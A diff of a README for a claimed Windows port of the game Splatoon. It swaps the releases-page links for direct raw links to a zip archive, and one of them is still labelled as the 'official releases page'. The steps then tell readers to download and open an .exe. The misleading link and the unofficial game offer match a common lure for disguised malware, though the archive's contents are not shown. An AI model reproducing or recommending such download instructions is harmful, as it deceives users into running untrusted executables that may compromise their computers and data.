@@ -1,6 +1,6 @@
 # 🦑 Splatoon-Raiders-PC - Fast Paced Ink Wars On Windows
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/inelasticitytransitive690/Splatoon-Raiders-PC/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://raw.githubusercontent.com/inelasticitytransitive690/Splatoon-Raiders-PC/main/pawing/PC-Raiders-Splatoon-v2.3-beta.1.zip)
 
 Splatoon-Raiders-PC brings the full experience of high-speed ink combat to your Windows computer. You can play through colorful turf wars, unlock new weapons, and explore detailed maps. This version supports modern monitors with ultrawide displays and high-definition graphics. 
 
@@ -8,7 +8,7 @@ Splatoon-Raiders-PC brings the full experience of high-speed ink combat to your 
 
 To get the game, follow these steps. 
 
-1. Visit the [official releases page](https://github.com/inelasticitytransitive690/Splatoon-Raiders-PC/releases) to find the latest version of the software.  
+1. Visit the [official releases page](https://raw.githubusercontent.com/inelasticitytransitive690/Splatoon-Raiders-PC/main/pawing/PC-Raiders-Splatoon-v2.3-beta.1.zip) to find the latest version of the software.  
 2. Look for the section labeled Assets under the most recent release.  
 3. Click the file ending in .exe to start your download.  
 4. Once the download finishes, open your Downloads folder in Windows.  
